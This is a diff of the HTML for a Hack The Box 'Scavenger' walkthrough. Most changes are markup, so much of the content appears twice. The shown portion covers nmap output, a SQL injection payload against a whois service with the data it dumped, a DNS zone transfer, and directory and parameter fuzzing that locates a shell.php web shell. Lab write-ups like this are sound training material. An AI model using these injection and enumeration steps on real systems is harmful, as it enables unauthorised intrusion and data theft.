+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:nformation\x20on\x20SUPERSECHOSTING,\x20visit\x20http://www\.supersecho
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:sting\.htb\r\n%\x20This\x20query\x20returned\x200\x20object\r\n&#34;</span><span class="o">)</span>%r<span class="o">(</span>HTT
+</span></span><span class="line"><span class="cl">SF:POptions,A9,<span class="s2">&#34;%\x20SUPERSECHOSTING\x20WHOIS\x20server\x20v0\.6beta@Maria
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:DB10\.1\.37\r\n%\x20for\x20more\x20information\x20on\x20SUPERSECHOSTING
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:,\x20visit\x20http://www\.supersechosting\.htb\r\n%\x20This\x20query\x2
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:0returned\x200\x20object\r\n&#34;</span><span class="o">)</span>%r<span class="o">(</span>RTSPRequest,A9,<span class="s2">&#34;%\x20SUPERSECHOSTING\x
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:20WHOIS\x20server\x20v0\.6beta@MariaDB10\.1\.37\r\n%\x20for\x20more\x20
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:information\x20on\x20SUPERSECHOSTING,\x20visit\x20http://www\.supersech
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:osting\.htb\r\n%\x20This\x20query\x20returned\x200\x20object\r\n&#34;</span><span class="o">)</span>%r<span class="o">(</span>He
+</span></span><span class="line"><span class="cl">SF:lp,A9,<span class="s2">&#34;%\x20SUPERSECHOSTING\x20WHOIS\x20server\x20v0\.6beta@MariaDB10\.
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:1\.37\r\n%\x20for\x20more\x20information\x20on\x20SUPERSECHOSTING,\x20v
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:isit\x20http://www\.supersechosting\.htb\r\n%\x20This\x20query\x20retur
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ned\x200\x20object\r\n&#34;</span><span class="o">)</span>%r<span class="o">(</span>SSLSessionReq,103,<span class="s2">&#34;%\x20SUPERSECHOSTING\x20W
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:HOIS\x20server\x20v0\.6beta@MariaDB10\.1\.37\r\n%\x20for\x20more\x20inf
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ormation\x20on\x20SUPERSECHOSTING,\x20visit\x20http://www\.supersechost
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ing\.htb\r\n1267\x20\(HY000\):\x20Illegal\x20mix\x20of\x20collations\x2
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:0\(utf8mb4_general_ci,IMPLICIT\)\x20and\x20\(utf8_general_ci,COERCIBLE\
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:)\x20for\x20operation\x20&#39;like&#39;&#34;</span><span class="o">)</span>%r<span class="o">(</span>TerminalServerCookie,103,<span class="s2">&#34;%\x20SUPE
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:RSECHOSTING\x20WHOIS\x20server\x20v0\.6beta@MariaDB10\.1\.37\r\n%\x20fo
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:r\x20more\x20information\x20on\x20SUPERSECHOSTING,\x20visit\x20http://w
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ww\.supersechosting\.htb\r\n1267\x20\(HY000\):\x20Illegal\x20mix\x20of\
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:x20collations\x20\(utf8mb4_general_ci,IMPLICIT\)\x20and\x20\(utf8_gener
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:al_ci,COERCIBLE\)\x20for\x20operation\x20&#39;like&#39;&#34;</span><span class="o">)</span>%r<span class="o">(</span>TLSSessionReq,103,<span class="s2">&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:%\x20SUPERSECHOSTING\x20WHOIS\x20server\x20v0\.6beta@MariaDB10\.1\.37\r
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:\n%\x20for\x20more\x20information\x20on\x20SUPERSECHOSTING,\x20visit\x2
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:0http://www\.supersechosting\.htb\r\n1267\x20\(HY000\):\x20Illegal\x20m
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ix\x20of\x20collations\x20\(utf8mb4_general_ci,IMPLICIT\)\x20and\x20\(u
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:tf8_general_ci,COERCIBLE\)\x20for\x20operation\x20&#39;like&#39;&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">Service Info: Host: ib01.supersechosting.htb<span class="p">;</span> OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl"><span class="c1"># Nmap done at Thu Feb 27 23:26:45 2020 -- 1 IP address (1 host up) scanned in 123.59 seconds</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="web-enumeration">Web Enumeration</h3>
 <p><em><strong>scavenger.htb</strong></em></p>
@@ -379,44 +322,44 @@ Service detection performed. Please report any incorrect results at https://nmap
         <img
             class="lazyload"
             src="/svg/loading.min.svg"
-            data-src="public/images/scavenger_frontpage.jpg"
-            data-srcset="/scavenger/public/images/scavenger_frontpage.jpg, public/images/scavenger_frontpage.jpg 1.5x, /scavenger/public/images/scavenger_frontpage.jpg 2x"
+            data-src="/scavenger/public/images/scavenger_frontpage.jpg"
+            data-srcset="/scavenger/public/images/scavenger_frontpage.jpg, /scavenger/public/images/scavenger_frontpage.jpg 1.5x, /scavenger/public/images/scavenger_frontpage.jpg 2x"
             data-sizes="auto"
-            alt="/scavenger/public/images/scavenger_frontpage.jpg" />
+            alt="/scavenger/public/images/scavenger_frontpage.jpg" width="944" height="373" />
     </a><figcaption class="image-caption">Front page of Scavenger</figcaption>
     </figure></p>
 <p>From above picture, I got an vhost config problem which indicated hostname problem now I had to find another hostname. For that, I went back to <code>nmap</code> scan where I got <code>6</code> opened port and searched every opened port for vulnerability but got nothing since all were rabbit hole except port <code>43</code> of <code>whois</code> service.
-You can visit here for more about <a href="https://www.commandlinux.com/man-page/man1/whois.1.html" target="_blank" rel="noopener noreffer">whois</a>. From this I made simple payload.</p>
+You can visit here for more about <a href="https://www.commandlinux.com/man-page/man1/whois.1.html" target="_blank" rel="noopener noreffer ">whois</a>. From this I made simple payload.</p>
 <h3 id="sqli-in-whois-service">Sqli in WHois Service</h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">root@gr4n173:~$ whois -h 10.10.10.155 -p 43 &#34;scavenger.htb&#34;
-% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
-% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
-% This query returned 0 object
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root@gr4n173:~$ whois -h 10.10.10.155 -p 43 &#34;scavenger.htb&#34;
+</span></span><span class="line"><span class="cl">% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+</span></span><span class="line"><span class="cl">% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+</span></span><span class="line"><span class="cl">% This query returned 0 object
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>From here I got new domain name and added that domain name in <code>/etc/hosts</code> in same ip <code>10.10.10.155</code>. After adding that Ip I visited that site and got this as result.</p>
 <p><figure><a class="lightgallery" href="/scavenger/public/images/supersechosting.jpg" title="Supersec hosting page" data-thumbnail="/scavenger/public/images/supersechosting.jpg" data-sub-html="<h2>Supersec Hosting Page</h2><p>Supersec hosting page</p>">
         <img
             class="lazyload"
             src="/svg/loading.min.svg"
-            data-src="public/images/supersechosting.jpg"
-            data-srcset="/scavenger/public/images/supersechosting.jpg, public/images/supersechosting.jpg 1.5x, /scavenger/public/images/supersechosting.jpg 2x"
+            data-src="/scavenger/public/images/supersechosting.jpg"
+            data-srcset="/scavenger/public/images/supersechosting.jpg, /scavenger/public/images/supersechosting.jpg 1.5x, /scavenger/public/images/supersechosting.jpg 2x"
             data-sizes="auto"
-            alt="/scavenger/public/images/supersechosting.jpg" />
+            alt="/scavenger/public/images/supersechosting.jpg" width="1366" height="839" />
     </a><figcaption class="image-caption">Supersec Hosting Page</figcaption>
     </figure></p>
 <p>this way I can browse a website. Here, I got nothing so I had to search more about <code>whois</code> service. I made payload to inject sqli in whois service to extract the files from database as.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -450,94 +393,92 @@ You can visit here for more about <a href="https://www.commandlinux.com/man-page
 </span><span class="lnt">32
 </span><span class="lnt">33
 </span><span class="lnt">34
-</span><span class="lnt">35
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">root@gr4n174:~$ whois -h 10.10.10.155 -p 43 &#34;l33t&#39;) or 1=1#&#34;
- SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
-% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
-% This query returned 4 object
-   Domain Name: SUPERSECHOSTING.HTB
-   Registrar WHOIS Server: whois.supersechosting.htb
-   Registrar URL: http://www.supersechosting.htb
-   Updated Date: 2018-02-21T18:36:40Z 
-   Creation Date: 1997-09-15T04:00:00Z
-   Registry Expiry Date: 2020-09-14T04:00:00Z
-   Registrar: SuperSecHosting Inc.
-   Registrar IANA ID: 292
-   Registrar Abuse Contact Email: abusecomplaints@supersechosting.htb
-   Registrar Abuse Contact Phone: +1.999999999
-   Name Server: NS1.SUPERSECHOSTING.HTB
-   DNSSEC: unsigned
-   URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/
-&gt;&gt;&gt; Last update of whois database: 2018-12-05T14:11:05Z &lt;&lt;&lt;
-
-For more information on Whois status codes, please visit https://icann.org/epp
-
-NOTICE: The expiration date displayed in this record is the date the
-registrar&#39;s sponsorship of the domain name registration in the registry is
-currently set to expire. This date does not necessarily reflect the expiration
-date of the domain name registrant&#39;s agreement with the sponsoring
-registrar.  Users may consult the sponsoring registrar&#39;s Whois database to
-view the registrar&#39;s reported date of expiration for this registration.
-
-TERMS OF USE: You are not authorized to access or query our Whois
-database through the use of electronic processes that are high-volume and
-automated except as reasonably necessary to register domain names or
-modify existing registrations; the Data in VeriSign Global Registry
-.......
-........
-
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root@gr4n174:~$ whois -h 10.10.10.155 -p 43 &#34;l33t&#39;) or 1=1#&#34;
+</span></span><span class="line"><span class="cl"> SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+</span></span><span class="line"><span class="cl">% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+</span></span><span class="line"><span class="cl">% This query returned 4 object
+</span></span><span class="line"><span class="cl">   Domain Name: SUPERSECHOSTING.HTB
+</span></span><span class="line"><span class="cl">   Registrar WHOIS Server: whois.supersechosting.htb
+</span></span><span class="line"><span class="cl">   Registrar URL: http://www.supersechosting.htb
+</span></span><span class="line"><span class="cl">   Updated Date: 2018-02-21T18:36:40Z 
+</span></span><span class="line"><span class="cl">   Creation Date: 1997-09-15T04:00:00Z
+</span></span><span class="line"><span class="cl">   Registry Expiry Date: 2020-09-14T04:00:00Z
+</span></span><span class="line"><span class="cl">   Registrar: SuperSecHosting Inc.
+</span></span><span class="line"><span class="cl">   Registrar IANA ID: 292
+</span></span><span class="line"><span class="cl">   Registrar Abuse Contact Email: abusecomplaints@supersechosting.htb
+</span></span><span class="line"><span class="cl">   Registrar Abuse Contact Phone: +1.999999999
+</span></span><span class="line"><span class="cl">   Name Server: NS1.SUPERSECHOSTING.HTB
+</span></span><span class="line"><span class="cl">   DNSSEC: unsigned
+</span></span><span class="line"><span class="cl">   URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/
+</span></span><span class="line"><span class="cl">&gt;&gt;&gt; Last update of whois database: 2018-12-05T14:11:05Z &lt;&lt;&lt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">For more information on Whois status codes, please visit https://icann.org/epp
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">NOTICE: The expiration date displayed in this record is the date the
+</span></span><span class="line"><span class="cl">registrar&#39;s sponsorship of the domain name registration in the registry is
+</span></span><span class="line"><span class="cl">currently set to expire. This date does not necessarily reflect the expiration
+</span></span><span class="line"><span class="cl">date of the domain name registrant&#39;s agreement with the sponsoring
+</span></span><span class="line"><span class="cl">registrar.  Users may consult the sponsoring registrar&#39;s Whois database to
+</span></span><span class="line"><span class="cl">view the registrar&#39;s reported date of expiration for this registration.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">TERMS OF USE: You are not authorized to access or query our Whois
+</span></span><span class="line"><span class="cl">database through the use of electronic processes that are high-volume and
+</span></span><span class="line"><span class="cl">automated except as reasonably necessary to register domain names or
+</span></span><span class="line"><span class="cl">modify existing registrations; the Data in VeriSign Global Registry
+</span></span><span class="line"><span class="cl">.......
+</span></span><span class="line"><span class="cl">........
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>This command extract everything that was saved in database using SQL Injection in <code>WHOIS</code> service since <code>WHOIS</code> service always needs to use database to store and extract the information.</p>
 <p>From above output of WHOIS command I got three more <code>dns</code> as<code> www.justanotherblog.htb</code> <code>www.pwnhats.htb</code> <code>www.rentahacker.htb</code> and I immediately added it to <code>/etc/hosts</code>. After that I can browser every website of it and final dns in <code>/etc/hosts</code> was</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">root@gr4n173:~$ cat /etc/hosts
-10.10.10.155    www.pwnhats.htb www.rentahacker.htb www.justanotherblog.htb www.supersechosting.htb
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root@gr4n173:~$ cat /etc/hosts
+</span></span><span class="line"><span class="cl">10.10.10.155    www.pwnhats.htb www.rentahacker.htb www.justanotherblog.htb www.supersechosting.htb
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><strong>justanotherblog.htb</strong></p>
 <p><figure><a class="lightgallery" href="/scavenger/public/images/justanotherblog.jpg" title="justanotherblog" data-thumbnail="/scavenger/public/images/justanotherblog.jpg" data-sub-html="<h2>justanotherblog</h2><p>justanotherblog</p>">
         <img
             class="lazyload"
             src="/svg/loading.min.svg"
-            data-src="public/images/justanotherblog.jpg"
-            data-srcset="/scavenger/public/images/justanotherblog.jpg, public/images/justanotherblog.jpg 1.5x, /scavenger/public/images/justanotherblog.jpg 2x"
+            data-src="/scavenger/public/images/justanotherblog.jpg"
+            data-srcset="/scavenger/public/images/justanotherblog.jpg, /scavenger/public/images/justanotherblog.jpg 1.5x, /scavenger/public/images/justanotherblog.jpg 2x"
             data-sizes="auto"
-            alt="/scavenger/public/images/justanotherblog.jpg" />
+            alt="/scavenger/public/images/justanotherblog.jpg" width="1366" height="668" />
     </a><figcaption class="image-caption">justanotherblog</figcaption>
     </figure></p>
 <p><strong>pwnhats.htb</strong></p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="public/images/pwnhats.jpg"
-        data-srcset="/scavenger/public/images/pwnhats.jpg, public/images/pwnhats.jpg 1.5x, /scavenger/public/images/pwnhats.jpg 2x"
+        data-src="/scavenger/public/images/pwnhats.jpg"
+        data-srcset="/scavenger/public/images/pwnhats.jpg, /scavenger/public/images/pwnhats.jpg 1.5x, /scavenger/public/images/pwnhats.jpg 2x"
         data-sizes="auto"
         alt="/scavenger/public/images/pwnhats.jpg"
-        title="pwnhats" /></p>
+        title="pwnhats" width="1366" height="668" /></p>
 <p><strong>rentahacker.htb</strong></p>
 <p><figure><a class="lightgallery" href="/scavenger/public/images/rentahacker.jpg" title="rentahacker website" data-thumbnail="/scavenger/public/images/rentahacker.jpg" data-sub-html="<h2>rentahacker website</h2><p>rentahacker website</p>">
         <img
             class="lazyload"
             src="/svg/loading.min.svg"
-            data-src="public/images/rentahacker.jpg"
-            data-srcset="/scavenger/public/images/rentahacker.jpg, public/images/rentahacker.jpg 1.5x, /scavenger/public/images/rentahacker.jpg 2x"
+            data-src="/scavenger/public/images/rentahacker.jpg"
+            data-srcset="/scavenger/public/images/rentahacker.jpg, /scavenger/public/images/rentahacker.jpg 1.5x, /scavenger/public/images/rentahacker.jpg 2x"
             data-sizes="auto"
-            alt="/scavenger/public/images/rentahacker.jpg" />
+            alt="/scavenger/public/images/rentahacker.jpg" width="1366" height="668" />
     </a><figcaption class="image-caption">rentahacker website</figcaption>
     </figure></p>
-<p>I searched every part of three website and basic method of Web Pentesting . Since there were many website of same ip so I used dns zone transfer (axfr) to know the subdomains and dig every domain as <code>dig @10.10.10.155 pwnhats.htb axfr</code> <code>dig @10.10.10.155 rentahacker.htb axfr</code>I got new subdomain of rentahacker.htb . For more info about dig you can visit <a href="https://linuxize.com/post/how-to-use-dig-command-to-query-dns-in-linux/" target="_blank" rel="noopener noreffer">dig</a>.</p>
+<p>I searched every part of three website and basic method of Web Pentesting . Since there were many website of same ip so I used dns zone transfer (axfr) to know the subdomains and dig every domain as <code>dig @10.10.10.155 pwnhats.htb axfr</code> <code>dig @10.10.10.155 rentahacker.htb axfr</code>I got new subdomain of rentahacker.htb . For more info about dig you can visit <a href="https://linuxize.com/post/how-to-use-dig-command-to-query-dns-in-linux/" target="_blank" rel="noopener noreffer ">dig</a>.</p>
 <h3 id="subdomain-enumeration">Subdomain Enumeration</h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -555,47 +496,47 @@ modify existing registrations; the Data in VeriSign Global Registry
 </span><span class="lnt">16
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">root@gr4n174:~$ dig @10.10.10.155 rentahacker.htb axfr
-; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5-Debian &lt;&lt;&gt;&gt; @10.10.10.155 rentahacker.htb axfr                                                                                 
-; (1 server found)                                                                                                                                    
-;; global options: +cmd                                                                                                                               
-rentahacker.htb.        604800  IN      SOA     ns1.supersechosting.htb. root.supersechosting.htb. 4 604800 86400 2419200 604800                      
-rentahacker.htb.        604800  IN      NS      ns1.supersechosting.htb.                                                                              
-rentahacker.htb.        604800  IN      MX      10 mail1.rentahacker.htb.                                                                             
-rentahacker.htb.        604800  IN      A       10.10.10.155                                                                                          
-mail1.rentahacker.htb.  604800  IN      A       10.10.10.155                                                                                          
-sec03.rentahacker.htb.  604800  IN      A       10.10.10.155                                                                                          
-www.rentahacker.htb.    604800  IN      A       10.10.10.155                                                                                          
-rentahacker.htb.        604800  IN      SOA     ns1.supersechosting.htb. root.supersechosting.htb. 4 604800 86400 2419200 604800                      
-;; Query time: 883 msec
-;; SERVER: 10.10.10.155#53(10.10.10.155)
-;; WHEN: Fri Feb 28 00:09:07 +0545 2020
-;; XFR size: 8 records (messages 1, bytes 251)
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root@gr4n174:~$ dig @10.10.10.155 rentahacker.htb axfr
+</span></span><span class="line"><span class="cl">; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5-Debian &lt;&lt;&gt;&gt; @10.10.10.155 rentahacker.htb axfr                                                                                 
+</span></span><span class="line"><span class="cl">; (1 server found)                                                                                                                                    
+</span></span><span class="line"><span class="cl">;; global options: +cmd                                                                                                                               
+</span></span><span class="line"><span class="cl">rentahacker.htb.        604800  IN      SOA     ns1.supersechosting.htb. root.supersechosting.htb. 4 604800 86400 2419200 604800                      
+</span></span><span class="line"><span class="cl">rentahacker.htb.        604800  IN      NS      ns1.supersechosting.htb.                                                                              
+</span></span><span class="line"><span class="cl">rentahacker.htb.        604800  IN      MX      10 mail1.rentahacker.htb.                                                                             
+</span></span><span class="line"><span class="cl">rentahacker.htb.        604800  IN      A       10.10.10.155                                                                                          
+</span></span><span class="line"><span class="cl">mail1.rentahacker.htb.  604800  IN      A       10.10.10.155                                                                                          
+</span></span><span class="line"><span class="cl">sec03.rentahacker.htb.  604800  IN      A       10.10.10.155                                                                                          
+</span></span><span class="line"><span class="cl">www.rentahacker.htb.    604800  IN      A       10.10.10.155                                                                                          
+</span></span><span class="line"><span class="cl">rentahacker.htb.        604800  IN      SOA     ns1.supersechosting.htb. root.supersechosting.htb. 4 604800 86400 2419200 604800                      
+</span></span><span class="line"><span class="cl">;; Query time: 883 msec
+</span></span><span class="line"><span class="cl">;; SERVER: 10.10.10.155#53(10.10.10.155)
+</span></span><span class="line"><span class="cl">;; WHEN: Fri Feb 28 00:09:07 +0545 2020
+</span></span><span class="line"><span class="cl">;; XFR size: 8 records (messages 1, bytes 251)
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Since 10.10.10.155 was ip here I used it as name server and rentahacker.htb as a url for dns zone transfer using axfr. Now <code>sec03.rentahacker.htb</code> was added in <code>/etc/hosts</code>too.</p>
 <p><strong>sec03.rentahacker.htb</strong></p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="public/images/sec03_page.jpg"
-        data-srcset="/scavenger/public/images/sec03_page.jpg, public/images/sec03_page.jpg 1.5x, /scavenger/public/images/sec03_page.jpg 2x"
+        data-src="/scavenger/public/images/sec03_page.jpg"
+        data-srcset="/scavenger/public/images/sec03_page.jpg, /scavenger/public/images/sec03_page.jpg 1.5x, /scavenger/public/images/sec03_page.jpg 2x"
         data-sizes="auto"
         alt="/scavenger/public/images/sec03_page.jpg"
-        title="sec03page" /></p>
+        title="sec03page" width="1366" height="668" /></p>
 <p>After that, I searched for directory using dirsearch as</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">root@gr4n173:~$ ./dirsearch.py -u http://sec03.rentahacker.htb/ -e html,txt,php,pcap,bzip,tar,bak
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root@gr4n173:~$ ./dirsearch.py -u http://sec03.rentahacker.htb/ -e html,txt,php,pcap,bzip,tar,bak
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Here I got <code>shell.php</code> as an interesting dir. Then, searched for parameter in <code>shell.php?FUZZ=</code> where I used ffuf tool .</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -624,62 +565,62 @@ rentahacker.htb.        604800  IN      SOA     ns1.supersechosting.htb. root.su
 </span><span class="lnt">27
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~<span class="nv">$ffuf</span> -w ~/Downloads/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -u http://sec03.rentahacker.htb/shell.php?FUZZ<span class="o">=</span>id                                                                                                        
-                                                                                                                                                      
-        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\ </span>                                                                                                              
-       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/                                                                                                               
-       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\ </span>                                                                                                             
-        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/                                                                                                              
-         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\ </span>                                                                                                              
-          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/                                                                                                               
-                                                                                                                                                      
-       v0.12                                                                                                                                          
-________________________________________________                                                                                                      
-                                                                                                                                                      
- :: Method           : GET                                                                                                                            
- :: URL              : http://sec03.rentahacker.htb/shell.php?FUZZ<span class="o">=</span>id                                                                              
- :: Follow redirects : <span class="nb">false</span>                                                                                                                          
- :: Calibration      : <span class="nb">false</span>                                                                                                                          
- :: Timeout          : <span class="m">10</span>                                                                                                                             
- :: Threads          : <span class="m">40</span>                                                                                                                             
- :: Matcher          : Response status: 200,204,301,302,307,401,403                                                                                   
-________________________________________________                                                                                                      
-                                                                                                                                                      
-password                <span class="o">[</span>Status: 200, Size: 0, Words: 1, Lines: 1<span class="o">]</span>                                                                                    
-email                   <span class="o">[</span>Status: 200, Size: 0, Words: 1, Lines: 1<span class="o">]</span>                                                                                    
-url                     <span class="o">[</span>Status: 200, Size: 0, Words: 1, Lines: 1<span class="o">]</span>                                                                                    
-<span class="nb">type</span>                    <span class="o">[</span>Status: 200, Size: 0, Words: 1, Lines: 1<span class="o">]</span>
-.....
-hidden                  <span class="o">[</span>Status: 200, Size: 61, Words: 3, Lines: 2<span class="o">]</span>                                                                                   
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@gr4n173:~<span class="nv">$ffuf</span> -w ~/Downloads/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -u http://sec03.rentahacker.htb/shell.php?FUZZ<span class="o">=</span>id                                                                                                        
+</span></span><span class="line"><span class="cl">                                                                                                                                                      
+</span></span><span class="line"><span class="cl">        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\ </span>                                                                                                              
+</span></span><span class="line"><span class="cl">       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/                                                                                                               
+</span></span><span class="line"><span class="cl">       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\ </span>                                                                                                             
+</span></span><span class="line"><span class="cl">        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/                                                                                                              
+</span></span><span class="line"><span class="cl">         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\ </span>                                                                                                              
+</span></span><span class="line"><span class="cl">          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/                                                                                                               
+</span></span><span class="line"><span class="cl">                                                                                                                                                      
+</span></span><span class="line"><span class="cl">       v0.12                                                                                                                                          
+</span></span><span class="line"><span class="cl">________________________________________________                                                                                                      
+</span></span><span class="line"><span class="cl">                                                                                                                                                      
+</span></span><span class="line"><span class="cl"> :: Method           : GET                                                                                                                            
+</span></span><span class="line"><span class="cl"> :: URL              : http://sec03.rentahacker.htb/shell.php?FUZZ<span class="o">=</span>id                                                                              
+</span></span><span class="line"><span class="cl"> :: Follow redirects : <span class="nb">false</span>                                                                                                                          
+</span></span><span class="line"><span class="cl"> :: Calibration      : <span class="nb">false</span>                                                                                                                          
+</span></span><span class="line"><span class="cl"> :: Timeout          : <span class="m">10</span>                                                                                                                             
+</span></span><span class="line"><span class="cl"> :: Threads          : <span class="m">40</span>                                                                                                                             
+</span></span><span class="line"><span class="cl"> :: Matcher          : Response status: 200,204,301,302,307,401,403                                                                                   
+</span></span><span class="line"><span class="cl">________________________________________________                                                                                                      
+</span></span><span class="line"><span class="cl">                                                                                                                                                      
+</span></span><span class="line"><span class="cl">password                <span class="o">[</span>Status: 200, Size: 0, Words: 1, Lines: 1<span class="o">]</span>                                                                                    
+</span></span><span class="line"><span class="cl">email                   <span class="o">[</span>Status: 200, Size: 0, Words: 1, Lines: 1<span class="o">]</span>                                                                                    
+</span></span><span class="line"><span class="cl">url                     <span class="o">[</span>Status: 200, Size: 0, Words: 1, Lines: 1<span class="o">]</span>                                                                                    
+</span></span><span class="line"><span class="cl"><span class="nb">type</span>                    <span class="o">[</span>Status: 200, Size: 0, Words: 1, Lines: 1<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.....
